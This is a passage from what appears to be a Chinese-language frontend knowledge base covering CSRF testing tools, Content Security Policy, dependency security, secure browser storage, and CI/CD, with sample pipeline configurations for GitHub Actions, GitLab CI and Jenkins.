- OWASP ZAP：OWASP ZAP（Zed Attack Proxy）是OWASP组织开发的开源Web应用安全扫描工具，提供自动扫描器和手动测试功能，可以检测SQL注入、XSS、CSRF等常见Web安全漏洞，支持代理模式、主动扫描、被动扫描等多种测试方式，是Web安全测试的入门首选工具，完全免费且开源
- Burp Suite：Burp Suite是专业的Web安全测试工具，提供代理服务器、漏洞扫描器、 intruder（暴力破解工具）、Repeater（请求重放工具）等功能，是安全工程师的标准工具，分为免费版和专业版，专业版提供更强大的扫描能力和自动化功能，可以检测复杂的安全漏洞，是Web渗透测试的行业标准工具
- CSRF Tester：CSRF Tester是OWASP开发的CSRF漏洞检测工具，通过代理模式拦截用户请求，自动生成CSRF攻击测试用例，帮助测试人员发现Web应用中的CSRF漏洞，该工具可以自动分析表单并生成包含CSRF令牌的测试请求，帮助开发者验证CSRF防护措施的有效性
- Acunetix：Acunetix是一款商业Web应用漏洞扫描器，提供自动化的安全扫描服务，支持检测SQL注入、XSS、CSRF、文件包含、命令注入等数千种安全漏洞，提供详细的漏洞报告和修复建议，集成CI/CD流水线功能，适合企业级Web安全测试，支持自动化定期扫描和实时监控

**学习资源：**
- OWASP CSRF 防护 cheat sheet：OWASP发布的CSRF防护最佳实践指南，详细介绍了CSRF攻击的原理、预防方法、检测技术等，包括使用CSRF Token、同源检测、SameSite Cookie等防护措施，是学习CSRF防护的重要参考资料，提供了多种编程语言的实现示例
- MDN 安全文档：Mozilla Developer Network（MDN）提供的Web安全文档，是学习Web安全的权威参考，涵盖XSS、CSRF、CSP、HTTPS等所有Web安全主题，提供了详细的解释、代码示例和最佳实践，是前端开发者学习安全知识的首选资源
- 框架 CSRF 防护指南
- 安全社区论坛

### 案例分析

**知名 CSRF 攻击事件：**
- GitHub CSRF 漏洞：GitHub曾被发现存在CSRF漏洞，攻击者可以利用该漏洞修改用户的仓库设置、创建删除文件等，这个漏洞的发现推动了业界对CSRF防护的重视，学习这些历史漏洞案例有助于理解CSRF攻击的危害和防护的重要性
- Facebook CSRF 漏洞：Facebook曾被发现存在CSRF漏洞，攻击者可以通过诱导用户点击恶意链接来执行未授权操作，如点赞、关注、发布内容等，这个漏洞影响范围广泛，暴露了社交网络平台在CSRF防护方面的不足，学习此类案例有助于理解CSRF攻击的实际危害
- 银行网站 CSRF 漏洞
- 大型网站的安全事件

**防护措施效果：**
- CSRF token 的有效性
- SameSite cookie 的作用
- 多重防护的重要性
- 安全意识的作用`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"csp-implementation",title:"内容安全策略 (CSP) 实施",category:"security",difficulty:"medium",tags:["前端安全","CSP","内容安全策略","安全配置"],content:`## 内容安全策略 (CSP) 实施

内容安全策略 (Content Security Policy, CSP) 是一种安全机制，通过指定哪些资源可以被加载和执行，从而减少 XSS 等攻击的风险。

### CSP 基本概念

**定义：**
- 浏览器安全机制
- 通过 HTTP 头部或 meta 标签指定
- 限制资源加载来源
- 防止恶意脚本执行

**目标：**
- 减少 XSS 攻击风险
- 防止数据窃取
- 提高网站安全性
- 提供安全监控

**工作原理：**
- 浏览器解析 CSP 指令
- 验证资源加载请求
- 阻止不符合策略的资源
- 报告违规行为

### CSP 指令

**资源来源指令：**
- default-src：默认资源来源
- script-src：脚本来源
- style-src：样式来源
- img-src：图片来源
- font-src：字体来源
- media-src：媒体来源
- connect-src：网络请求来源
- frame-src：框架来源

**行为限制指令：**
- script-src-elem：脚本元素来源
- script-src-attr：脚本属性来源
- style-src-elem：样式元素来源
- style-src-attr：样式属性来源
- base-uri：base 标签来源
- form-action：表单提交目标
- frame-ancestors：允许嵌入当前页面的来源

**报告指令：**
- report-uri：违规报告地址
- report-to：违规报告组
- report-sample：包含违规代码样本

### CSP 实施策略

**严格策略：**
- 仅允许受信任的来源
- 禁止内联脚本
- 禁止 eval() 等危险函数
- 适合安全性要求高的网站

**宽松策略：**
- 允许更多的来源
- 可能允许内联脚本
- 适合迁移阶段
- 逐步收紧策略

**迁移策略：**
- 首先使用 report-only 模式
- 分析违规报告
- 逐步调整策略
- 最终启用强制模式

### CSP 实施方法

**HTTP 头部：**
- Content-Security-Policy: 指令：Content-Security-Policy响应头是CSP的核心，用于指定允许加载资源的来源，主要指令包括default-src（默认来源）、script-src（脚本来源）、style-src（样式来源）、img-src（图片来源）、connect-src（连接来源）、font-src（字体来源）等，每个指令可以指定多个来源如'self'、'none'、'unsafe-inline'、https:等，合理配置CSP可以有效防御XSS和数据注入攻击
- Content-Security-Policy-Report-Only: 指令：Content-Security-Policy-Report-Only响应头用于测试CSP策略而不强制执行，当策略违规时会发送报告但不会阻止资源加载，非常适合在正式部署前测试CSP配置，通过report-uri或report-to指令指定报告接收地址，开发者可以查看哪些资源会被拦截据以调整策略
- 服务器配置
- 更灵活的控制

**Meta 标签：**
- <meta http-equiv="Content-Security-Policy" content="指令">
- 客户端配置
- 不支持 report-uri
- 适合静态网站

**配置示例：**

Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' 'unsafe-inline'; img-src 'self' data:; report-uri /csp-report

### CSP 最佳实践

**资源管理：**
- 使用 CDN 时指定完整 URL
- 避免使用 'unsafe-inline'
- 避免使用 'unsafe-eval'
- 使用 nonce 或 hash 允许特定内联脚本

**报告机制：**
- 实施报告机制
- 分析违规报告
- 及时调整策略
- 监控安全事件

**框架集成：**
- React：使用 dangerouslySetInnerHTML 时注意：React的dangerouslySetInnerHTML属性允许插入原始HTML内容，绕过React的自动转义机制，使用时必须先对内容进行严格的清理，可以使用DOMPurify等HTML清理库过滤恶意脚本，建议先评估是否真的需要使用dangerouslySetInnerHTML，尽量使用React组件化方式渲染内容
- Vue：v-html 指令的安全使用
- Angular：内置 CSP 支持：Angular框架内置了对内容安全策略的原生支持，可以通过Angular的Meta服务动态管理CSP策略，Angular的DomSanitizer提供了bypassSecurityTrustHtml、bypassSecurityTrustScript等方法用于安全地处理可信内容，使用这些方法时需要确保内容来源可靠，Angular还自动处理了大多数常见的XSS场景
- 检查框架文档

**测试与验证：**
- 使用 CSP 生成器
- 测试不同浏览器兼容性
- 验证策略效果
- 监控用户体验

### CSP 兼容性

**浏览器支持：**
- 现代浏览器支持良好
- IE 11 部分支持
- 移动浏览器支持
- 检查 Can I Use

**降级策略：**
- 不支持 CSP 的浏览器
- 备用安全措施
- 渐进增强
- 安全优先

### 工具与资源

**CSP 生成器：**
- CSP Generator：CSP Generator是在线CSP策略生成工具，帮助开发者创建适合自己网站的CSP配置，通过图形界面选择需要允许的脚本、样式、图片等来源，自动生成CSP策略代码，支持导出为HTTP头或meta标签格式，适合不了解CSP语法的开发者快速入门
- CSP Evaluator：CSP Evaluator是Google提供的在线CSP分析工具，可以评估网站CSP策略的安全性，检查是否存在潜在的配置问题，提供改进建议，支持输入CSP策略字符串或URL进行评估，是检测CSP配置错误的利器，帮助开发者发现可能被绕过的配置
- Google CSP Tool：Google提供的CSP配置工具和文档资源，帮助网站配置和验证内容安全策略，Google的CSPEvaluator是其中最常用的工具，Google还提供了详细的CSP部署指南和最佳实践，是学习CSP配置的重要资源
- Mozilla Observatory：Mozilla Observatory是Mozilla提供的网站安全分析工具，可以评估网站的CSP、HSTS、Cookie安全等多项安全配置，给出安全评分和改进建议，支持一键扫描和详细的配置检查，是评估网站整体安全状况的实用工具

**学习资源：**
- MDN CSP 文档：Mozilla Developer Network提供的CSP完整文档，详细介绍了CSP的所有指令、语法、使用方法，提供了代码示例和最佳实践，是学习CSP的权威参考文档，适合开发者深入了解CSP的各个方面
- OWASP CSP 指南：OWASP组织发布的CSP配置最佳实践指南，详细介绍了如何正确配置CSP来防御各种Web攻击，提供了常见场景的配置示例和注意事项，是企业级应用配置CSP的重要参考
- Google Web Fundamentals
- 安全社区论坛

### 案例分析

**成功实施 CSP 的网站：**
- Google
- Facebook
- Twitter
- 大型金融网站

**实施效果：**
- XSS 攻击减少
- 安全事件减少
- 开发规范改善
- 用户信任提升`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"dependency-security",title:"依赖包安全管理",category:"security",difficulty:"medium",tags:["前端安全","依赖包","安全审计","漏洞管理"],content:`## 依赖包安全管理

前端项目依赖众多第三方包，这些包可能存在安全漏洞，需要进行有效的安全管理。

### 依赖包安全风险

**漏洞类型：**
- 代码注入
- XSS 漏洞
- CSRF 漏洞
- 权限提升
- 信息泄露
- 拒绝服务

**风险来源：**
- 直接依赖的漏洞
- 间接依赖的漏洞
- 过时的依赖版本
- 恶意依赖包
- 供应链攻击

**影响范围：**
- 项目安全
- 用户数据安全
- 网站可用性
- 业务声誉

### 依赖包安全工具

**安全扫描工具：**
- npm audit：npm 内置工具
- yarn audit：Yarn 内置工具
- snyk：专业安全扫描
- dependabot：自动依赖更新
- OWASP Dependency-Check：OWASP Dependency-Check是开源的依赖漏洞扫描工具，可以分析项目依赖项并识别已知的安全漏洞，支持多种语言和构建工具，生成详细的漏洞报告，帮助开发者及时发现和修复依赖中的安全问题，是CI/CD流水线中常用的安全检查工具

**静态分析工具：**
- ESLint 安全插件
- SonarQube
- CodeQL：CodeQL是GitHub开发的代码分析引擎，支持多种编程语言，可以查询代码库中的安全漏洞，类似于SQL的查询语言让安全分析变得可编写和可复用，CodeQL是GitHub高级安全功能的核心组件，可以自动识别代码中的安全问题和代码异味
- Checkmarx

**监控工具：**
- GitHub Security Alerts：GitHub Security Alerts是GitHub提供的依赖安全告警功能，当项目的依赖项存在已知漏洞时会自动发送告警，可以在仓库的Security标签页查看漏洞详情，支持一键修复或手动更新依赖，建议启用此功能以确保依赖安全
- npm Security Advisories
- Snyk Monitor：Snyk Monitor是Snyk平台的依赖监控服务，持续跟踪项目依赖的安全状况，发现新漏洞时及时通知，可以与GitHub、GitLab等平台集成，提供自动化的漏洞检测和修复建议，支持开源项目和商业项目
- WhiteSource

### 依赖管理最佳实践

**依赖选择：**
- 选择活跃维护的包
- 查看 GitHub stars 和 issues
- 检查包的安全历史
- 优先选择官方或知名包

**版本管理：**
- 使用精确版本
- 避免使用 * 或 ^ 范围
- 定期更新依赖
- 测试更新后的兼容性

**依赖锁定：**
- 使用 package-lock.json 或 yarn.lock
- 确保一致的依赖版本
- 防止意外的依赖变更
- 便于审计和回滚

**安全审计：**
- 定期运行安全扫描
- 分析扫描结果
- 修复高风险漏洞
- 记录审计过程

### 漏洞修复策略

**紧急漏洞：**
- 立即更新或替换依赖
- 临时解决方案
- 部署修复
- 通知相关方

**高风险漏洞：**
- 制定修复计划
- 测试修复方案
- 安排部署
- 验证修复效果

**中低风险漏洞：**
- 纳入常规更新计划
- 监控漏洞状态
- 评估实际风险
- 适时修复

### 供应链安全

**依赖来源验证：**
- 使用官方 npm registry
- 配置 npm 镜像源
- 验证包的完整性
- 检查包的签名

**构建环境安全：**
- 隔离构建环境
- 使用固定版本的依赖
- 扫描构建产物
- 实施 CI/CD 安全检查

**依赖包审查：**
- 审查新引入的依赖
- 检查依赖的许可
- 评估依赖的安全性
- 建立依赖审批流程

### 工具集成

**CI/CD 集成：**
- 在构建过程中运行安全扫描
- 配置安全门禁
- 自动生成安全报告
- 集成依赖更新工具

**开发工具集成：**
- IDE 安全插件
- 代码审查工具
- 预提交钩子
- 开发环境安全检查

### 学习资源

**安全指南：**
- npm 安全文档
- OWASP 依赖管理指南
- Snyk 安全最佳实践
- GitHub 安全文档

**漏洞数据库：**
- CVE (Common Vulnerabilities and Exposures)：CVE是通用漏洞披露系统，为已知的安全漏洞提供唯一标识符，每个CVE编号对应一个公开披露的漏洞，如CVE-2021-44228是Log4j漏洞，CVE编号是漏洞交流和跟踪的标准方式，安全公告和漏洞数据库都使用CVE编号来标识漏洞
- NVD (National Vulnerability Database)：NVD是美国国家标准与技术研究院维护的国家漏洞数据库，收集和提供CVE漏洞的详细信息，包括漏洞描述、影响范围、严重程度评分（CVSS）、修复方案等，是查询漏洞信息的权威来源，支持按关键词、CVE编号、影响产品等条件搜索
- npm Security Advisories
- Snyk Vulnerability DB

### 案例分析

**依赖包漏洞事件：**
- event-stream 恶意包事件
- left-pad 事件
- npm 账号被盗事件
- 大型依赖漏洞影响

**安全管理效果：**
- 及时发现和修复漏洞
- 减少安全事件
- 提高开发团队安全意识
- 建立安全文化`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"secure-storage",title:"前端安全存储方案",category:"security",difficulty:"medium",tags:["前端安全","安全存储","localStorage","SessionStorage","加密"],content:`## 前端安全存储方案

前端需要存储各种数据，如用户偏好、会话信息等，但如何安全地存储这些数据是一个重要的安全考虑。

### 存储方案比较

**localStorage：**
- 持久存储
- 容量约 5MB
- 同步 API
- 同源策略
- 易受 XSS 攻击

**sessionStorage：**
- 会话存储
- 容量约 5MB
- 同步 API
- 同源策略
- 会话结束后清除

**IndexedDB：**
- 大型存储
- 容量较大（视浏览器而定）
- 异步 API
- 同源策略
- 适合复杂数据

**Cookie：**
- 小型数据
- 容量约 4KB
- 随请求发送
- 可设置 HttpOnly 和 Secure
- 适合会话管理

### 安全存储策略

**数据分类：**
- 敏感数据：避免在前端存储
- 非敏感数据：可以使用 localStorage
- 会话数据：使用 sessionStorage 或 HttpOnly Cookie
- 大型数据：使用 IndexedDB

**加密存储：**
- 敏感数据加密后存储
- 使用 Web Crypto API
- 加密密钥管理
- 定期轮换密钥

**访问控制：**
- 限制存储访问权限
- 验证数据完整性
- 防止未授权访问
- 实施最小权限原则

**数据清理：**
- 定期清理过期数据
- 用户登出时清除敏感数据
- 浏览器退出时清理会话数据
- 数据删除安全

### 安全风险与防护

**XSS 攻击风险：**
- localStorage 易受 XSS 攻击
- 攻击者可以窃取存储的数据
- 防护：实施 XSS 防护措施

**CSRF 攻击风险：**
- Cookie 易受 CSRF 攻击
- 防护：实施 CSRF 防护措施

**信息泄露风险：**
- 存储的敏感信息可能泄露
- 防护：加密存储、限制存储内容

**数据篡改风险：**
- 存储的数据可能被篡改
- 防护：数据验证、加密存储

### 最佳实践

**localStorage 使用：**
- 存储非敏感数据
- 避免存储用户凭证
- 定期清理数据
- 实施数据验证

**sessionStorage 使用：**
- 存储会话相关数据
- 避免存储敏感信息
- 会话结束后自动清理
- 适合临时数据

**IndexedDB 使用：**
- 存储大型数据
- 适合复杂数据结构
- 实施访问控制
- 定期备份和清理

**Cookie 使用：**
- 使用 HttpOnly 防止 XSS
- 使用 Secure 确保 HTTPS
- 使用 SameSite 防止 CSRF
- 合理设置过期时间

### 加密技术

**Web Crypto API：**
- 浏览器内置加密功能
- 支持对称加密和非对称加密
- 安全随机数生成
- 适合前端加密需求

**加密算法选择：**
- 对称加密：AES-GCM
- 非对称加密：RSA-OAEP
- 哈希函数：SHA-256
- 签名算法：ECDSA

**密钥管理：**
- 安全生成密钥
- 密钥存储安全
- 定期轮换密钥
- 密钥备份和恢复

### 工具与库

**加密库：**
- crypto-js
- jsencrypt
- forge
- webcrypto-liner

**存储库：**
- localforage
- dexie.js
- idb
- pouchdb

**安全库：**
- helmet.js
- crypto-browserify
- secure-ls
- js-cookie

### 案例分析

**安全存储方案：**
- 金融应用的存储策略
- 医疗应用的存储策略
- 企业应用的存储策略
- 个人应用的存储策略

**安全事件分析：**
- localStorage 数据泄露事件
- Cookie 会话劫持事件
- 存储数据篡改事件
- 安全存储最佳实践效果`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"ci-cd",title:"CI/CD 持续集成与部署",category:"engineering",difficulty:"medium",tags:["工程化","CI/CD","持续集成","持续部署","自动化"],content:`## CI/CD 持续集成与部署

CI/CD (Continuous Integration/Continuous Deployment) 是现代前端工程化的核心实践，通过自动化流程提高开发效率和代码质量。

### 🔄 CI/CD 概念

**持续集成 (CI)：**
- **频繁地将代码集成到主干分支**
- **自动化构建和测试**
- **尽早发现和解决问题**
- **确保代码质量**

**持续部署 (CD)：**
- **自动化部署流程**
- **快速交付功能**
- **减少人工干预**
- **提高部署可靠性**

**持续交付 (CD)：**
- **代码随时可以部署**
- **人工批准部署**
- **平衡速度和控制**
- **适合敏感环境**

### 🛠️ CI/CD 工具

**Jenkins：**
- **开源自动化服务器**
- **丰富的插件生态**
- **高度可定制**
- **适合复杂场景**

**GitHub Actions：**
- 与 GitHub 深度集成
- 基于工作流配置
- 内置 CI/CD 功能
- 易于使用

**GitLab CI/CD：**
- 与 GitLab 集成
- 基于 .gitlab-ci.yml 配置
- 内置容器支持
- 完整的 DevOps 平台

**CircleCI：**
- 快速的构建速度
- 基于配置文件
- 并行执行能力
- 适合现代应用

**Travis CI：**
- 易于配置
- 与 GitHub 集成
- 支持多种语言
- 适合开源项目

### CI/CD 工作流

**典型工作流：**
- 代码提交 → 触发构建
- 代码检查 → 单元测试
- 构建 → 集成测试
- 部署 → 验收测试
- 发布 → 监控

**分支策略：**
- Git Flow：主分支、开发分支、特性分支：Git Flow是一种经典的Git分支管理模型，由Vincent Driessen提出，包含两个长期分支（master主分支、develop开发分支）和三种短期分支（feature特性分支、release发布分支、hotfix热修复分支），master分支始终保持生产环境可用的代码，develop分支用于集成最新的功能开发，feature分支从develop分支创建，开发完成后合并回develop，release分支从develop分支创建，用于准备发布版本，hotfix分支从master分支创建，用于紧急修复生产问题，Git Flow适合有固定发布周期的项目
- GitHub Flow：主分支、特性分支：GitHub Flow是GitHub推荐的简化分支模型，只包含一个长期分支（main主分支）和短期分支（feature特性分支），main分支始终保持可部署状态，开发者从main分支创建feature分支进行开发，开发完成后通过Pull Request合并回main分支，合并后自动触发CI/CD流程部署到生产环境，GitHub Flow适合持续部署的项目，流程简单，适合小型团队和快速迭代的项目
- GitLab Flow：环境分支：GitLab Flow是GitLab推荐的分支模型，结合了Git Flow和GitHub Flow的优点，包含主分支、环境分支（production、staging、pre-production等）和特性分支，每个环境分支对应一个部署环境，特性分支开发完成后合并到主分支，主分支通过合并触发环境分支的更新，GitLab Flow支持多环境部署，适合有多个部署环境的项目，提供了更好的环境隔离和发布控制
- Trunk-based Development：单一主干分支：Trunk-based Development是一种基于单一主干分支的开发模式，所有开发者直接在主干分支上提交代码，通过功能开关（Feature Flags）控制新功能的发布，Trunk-based Development避免了复杂的分支合并，减少了集成冲突，支持持续集成和持续部署，适合大型团队和快速迭代的项目，但需要完善的自动化测试和代码审查机制

**环境管理：**
- 开发环境
- 测试环境
- 预生产环境
- 生产环境

### CI/CD 配置

**配置文件：**
- GitHub Actions：.github/workflows/*.yml：GitHub Actions是GitHub提供的CI/CD服务，配置文件位于.github/workflows目录下，使用YAML格式定义工作流，工作流可以包含多个job，每个job包含多个step，可以配置触发条件（push、pull_request、schedule等）、环境变量、缓存策略、并行执行等，GitHub Actions与GitHub仓库深度集成，支持自托管runner，提供丰富的action市场，是GitHub项目的首选CI/CD工具
- GitLab CI：.gitlab-ci.yml：GitLab CI是GitLab内置的CI/CD服务，配置文件位于项目根目录下的.gitlab-ci.yml，使用YAML格式定义流水线，流水线可以包含多个stage，每个stage包含多个job，可以配置依赖关系、artifacts、缓存、环境变量等，GitLab CI与GitLab仓库深度集成，支持Docker、Kubernetes等部署方式，提供丰富的内置变量和模板，是GitLab项目的首选CI/CD工具
- CircleCI：.circleci/config.yml：CircleCI是云端的CI/CD服务，配置文件位于.circleci目录下的config.yml，使用YAML格式定义工作流，工作流可以包含多个job，每个job包含多个step，可以配置Docker执行环境、缓存策略、并行执行、工作流编排等，CircleCI提供免费额度，支持自托管executor，提供丰富的orb（可重用配置）市场，是跨平台项目的CI/CD选择
- Jenkins：Jenkinsfile：Jenkins是开源的自动化服务器，通过Jenkinsfile（使用Groovy编写的流水线脚本）定义CI/CD流程，支持声明式和脚本式流水线语法，可以灵活定义构建、测试、部署的各个阶段，拥有丰富的插件生态系统，可以与各种工具和服务集成，是企业级CI/CD的常用选择

**关键配置：**
- 触发条件：push、pull_request：CI/CD流水线的触发条件决定了何时执行构建和部署，常见的触发条件包括push事件（代码推送到指定分支）、pull_request事件（创建或更新Pull Request）、schedule事件（定时触发）、manual事件（手动触发）、release事件（发布Release）等，合理配置触发条件可以优化CI/CD资源使用，如只在main分支的push时触发部署，在feature分支的push时只运行测试
- 环境变量：API 密钥、部署凭证：环境变量是CI/CD流水线中存储敏感信息和配置信息的重要方式，包括API密钥、数据库连接字符串、部署凭证、第三方服务配置等，环境变量应该在CI/CD平台的Secrets中安全存储，避免硬编码在代码仓库中，环境变量可以在构建和部署过程中注入到应用程序中，确保不同环境使用不同的配置
- 缓存策略：依赖缓存：缓存策略是优化CI/CD构建速度的重要手段，常见的缓存包括依赖缓存（node_modules、vendor等）、构建缓存（webpack缓存、Docker层缓存等），缓存可以显著减少构建时间，特别是在依赖安装和编译阶段，缓存策略应该根据依赖的稳定性进行配置，对于频繁变化的依赖应该设置较短的缓存时间或禁用缓存
- 并行执行：加速构建：并行执行是优化CI/CD构建速度的重要手段，通过并行运行独立的任务（如测试、代码检查、构建等）可以显著减少总构建时间，CI/CD平台通常支持job级别的并行和step级别的并行，合理配置并行执行可以充分利用CI/CD资源，但需要注意任务之间的依赖关系和资源限制
- 部署策略：蓝绿部署、滚动部署：部署策略决定了如何将新版本的应用程序部署到生产环境，常见的部署策略包括蓝绿部署（Blue-Green Deployment，维护两套完全相同的环境，新版本部署到空闲环境后切换流量）、滚动部署（Rolling Deployment，逐步替换旧版本实例）、金丝雀部署（Canary Deployment，先向小部分用户发布新版本）、金丝雀发布（Canary Release，逐步扩大新版本的用户范围），选择合适的部署策略可以最小化部署风险和downtime

### 最佳实践

**代码质量：**
- 代码风格检查
- 静态代码分析
- 单元测试
- 覆盖率报告

**安全检查：**
- 依赖包安全扫描
- 代码安全分析
- 敏感信息检测
- 安全漏洞扫描

**部署策略：**
- 蓝绿部署：零 downtime：蓝绿部署是一种零downtime的部署策略，维护两套完全相同的环境（蓝色环境和绿色环境），当前版本运行在蓝色环境，新版本部署到绿色环境，部署完成后通过负载均衡器将流量从蓝色环境切换到绿色环境，如果发现问题可以快速切换回蓝色环境，蓝绿部署适合对downtime要求高的应用，但需要双倍的服务器资源
- 滚动部署：逐步更新：滚动部署是一种逐步替换旧版本实例的部署策略，每次替换一部分实例（如20%），验证新版本正常运行后再继续替换下一部分，直到所有实例都更新为新版本，滚动部署可以节省服务器资源，但部署过程中会同时存在新旧版本，需要注意版本兼容性和数据迁移，滚动部署适合无状态应用和可以容忍短暂版本不一致的场景
- 金丝雀部署：小流量测试：金丝雀部署是一种先向小部分用户发布新版本的部署策略，新版本先部署到少量实例（如5%），向这部分用户提供服务，观察新版本的运行情况和用户反馈，确认没有问题后逐步扩大新版本的用户范围（如10%、25%、50%、100%），金丝雀部署可以快速发现新版本的问题，降低风险，适合大型应用和需要灰度发布的场景
- 回滚机制：快速恢复：回滚机制是CI/CD流水线的重要功能，当新版本部署后发现问题需要快速恢复到上一个稳定版本，回滚机制应该支持一键回滚、自动回滚（基于健康检查或监控指标）、部分回滚（只回滚有问题的服务）等，回滚机制应该与版本管理、配置管理、数据库迁移等配合，确保回滚后系统状态一致

**监控与告警：**
- 构建状态监控
- 部署成功率
- 测试覆盖率
- 性能指标

### 集成示例

**前端项目 CI/CD：**
- 安装依赖
- 代码风格检查
- 单元测试
- 构建项目
- 部署到 CDN
- 部署到服务器

**多环境部署：**
- 开发环境：自动部署：开发环境是开发者日常开发和测试的环境，应该配置自动部署，当代码推送到开发分支时自动触发CI/CD流程，部署到开发环境，开发环境应该与生产环境保持一致的技术栈和配置，但可以使用较小的资源规模，开发环境应该支持快速迭代和频繁部署
- 测试环境：合并到 develop 分支部署：测试环境是进行集成测试和QA测试的环境，当代码合并到develop分支时自动触发CI/CD流程，部署到测试环境，测试环境应该与生产环境保持一致的配置和数据结构，但可以使用模拟的第三方服务，测试环境应该支持自动化测试和手动测试，测试环境的部署应该包含完整的测试套件
- 预生产环境：合并到 release 分支部署：预生产环境（Staging环境）是模拟生产环境进行最终测试的环境，当代码合并到release分支时自动触发CI/CD流程，部署到预生产环境，预生产环境应该与生产环境保持完全一致的配置、数据结构和第三方服务，预生产环境用于进行压力测试、安全测试、用户验收测试（UAT），确保新版本在生产环境运行稳定
- 生产环境：合并到 main 分支部署：生产环境是面向最终用户的环境，当代码合并到main分支时自动触发CI/CD流程，部署到生产环境，生产环境的部署应该经过严格的测试和审批流程，生产环境应该配置监控、告警、日志收集等系统，生产环境的部署应该支持回滚机制，确保在出现问题时可以快速恢复

### 代码示例

#### GitHub Actions 配置示例

\`\`\`yaml
# .github/workflows/ci-cd.yml
name: CI/CD Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]

jobs:
  # 代码检查和测试
  test:
    runs-on: ubuntu-latest
    
    strategy:
      matrix:
        node-version: [16.x, 18.x]
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: \${{ matrix.node-version }}
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run linter
        run: npm run lint
      
      - name: Run type check
        run: npm run type-check
      
      - name: Run unit tests
        run: npm run test:unit
      
      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          files: ./coverage/lcov.info
  
  # 构建项目
  build:
    runs-on: ubuntu-latest
    needs: test
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 18.x
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Build project
        run: npm run build
      
      - name: Upload build artifacts
        uses: actions/upload-artifact@v3
        with:
          name: build
          path: dist/
  
  # 部署到开发环境
  deploy-dev:
    runs-on: ubuntu-latest
    needs: build
    if: github.ref == 'refs/heads/develop'
    
    steps:
      - name: Download build artifacts
        uses: actions/download-artifact@v3
        with:
          name: build
      
      - name: Deploy to development
        run: |
          # 部署到开发环境
          # 这里可以使用 AWS S3、Vercel、Netlify 等部署工具
          echo "Deploying to development environment"
  
  # 部署到生产环境
  deploy-prod:
    runs-on: ubuntu-latest
    needs: build
    if: github.ref == 'refs/heads/main'
    
    steps:
      - name: Download build artifacts
        uses: actions/download-artifact@v3
        with:
          name: build
      
      - name: Deploy to production
        run: |
          # 部署到生产环境
          echo "Deploying to production environment"
\`\`\`

#### GitLab CI/CD 配置示例

\`\`\`yaml
# .gitlab-ci.yml
stages:
  - test
  - build
  - deploy

variables:
  NODE_ENV: production

# 代码检查和测试
test:
  stage: test
  image: node:18
  
  before_script:
    - npm ci
  
  script:
    - npm run lint
    - npm run type-check
    - npm run test:unit
    - npm run test:coverage
  
  coverage: '/All files[^|]*\\|[^|]*\\s+([\\d\\.]+)/'
  artifacts:
    reports:
      coverage_report:
        coverage_format: cobertura
        path: coverage/cobertura-coverage.xml

# 构建项目
build:
  stage: build
  image: node:18
  
  before_script:
    - npm ci
  
  script:
    - npm run build
  
  artifacts:
    paths:
      - dist/
    expire_in: 1 week

# 部署到开发环境
deploy-dev:
  stage: deploy
  image: node:18
  
  only:
    - develop
  
  dependencies:
    - build
  
  script:
    - echo "Deploying to development environment"
    # 部署脚本

# 部署到生产环境
deploy-prod:
  stage: deploy
  image: node:18
  
  only:
    - main
  
  dependencies:
    - build
  
  script:
    - echo "Deploying to production environment"
    # 部署脚本
  
  when: manual
\`\`\`

#### Jenkins 配置示例

\`\`\`groovy
// Jenkinsfile
pipeline {
  agent any
  
  environment {
    NODE_VERSION = '18'
    CI = true
  }
  
  stages {
    stage('Checkout') {
      steps {
        checkout scm
      }
    }
    
    stage('Install') {
      steps {
        sh 'npm ci'
      }
    }
    
    stage('Lint') {
      steps {
        sh 'npm run lint'
      }
    }
    
    stage('Test') {
      steps {
        sh 'npm run test:unit'
        sh 'npm run test:coverage'
      }
      
      post {
        always {
          junit 'coverage/junit.xml'
          publishHTML(target: [
            reportDir: 'coverage',
            reportFiles: 'index.html',
            reportName: 'Coverage Report'
          ])
        }
      }
    }
    
    stage('Build') {
      steps {
        sh 'npm run build'
      }
    }
    
    stage('Deploy') {
      when {
        branch 'main'
      }
      
      steps {
        sh 'npm run deploy'
      }
    }
  }
  
  post {
    success {
      echo 'Pipeline succeeded!'
    }
    
    failure {
      echo 'Pipeline failed!'
      mail to: 'team@example.com',
           subject: "Jenkins Pipeline Failed: \${env.JOB_NAME} - \${env.BUILD_NUMBER}",
           body: "Build failed. Please check the Jenkins console output."
    }
  }
}
\`\`\`

### 工具与资源

**学习资源：**
- GitHub Actions 文档
- GitLab CI/CD 文档
- Jenkins 文档
- 持续集成与持续部署实践

**辅助工具：**
- SonarQube：代码质量分析
- Snyk：依赖安全扫描：Snyk是一个专注于依赖安全的工具，可以自动扫描项目中的开源依赖漏洞，提供修复建议和自动修复功能，支持GitHub、GitLab等代码托管平台集成，可以在CI/CD流水线中自动检测依赖安全漏洞，支持npm、yarn、pip等多种包管理器，是现代应用安全防护的重要工具
- Artifactory：制品管理：Artifactory是JFrog公司开发的制品仓库管理工具，支持Maven、npm、Docker等多种包格式，提供制品存储、版本管理、访问控制、依赖解析等功能，可以作为私有npm仓库、Docker镜像仓库使用，支持高可用部署和大规模二进制文件存储，是企业级制品管理的标准选择
- Prometheus：监控：Prometheus是开源的系统监控和告警工具，由SoundCloud开发并成为CNCF毕业项目，广泛用于云原生应用监控，通过拉取模式收集指标数据，支持多维度数据模型和强大的查询语言PromQL，可以与Grafana集成实现可视化，提供灵活的告警规则和通知渠道，是现代分布式系统监控的主流选择

### 案例分析

**大型项目 CI/CD：**
- Google 的 CI/CD 实践
- Facebook 的 CI/CD 实践
- Netflix 的 CI/CD 实践
- 阿里巴巴的 CI/CD 实践

**实施效果：**
- 开发效率提升
- 代码质量改善
- 部署可靠性提高
- 团队协作优化

### 最佳实践

**代码质量：**
- 代码风格检查
- 静态代码分析
- 单元测试
- 覆盖率报告

**安全检查：**
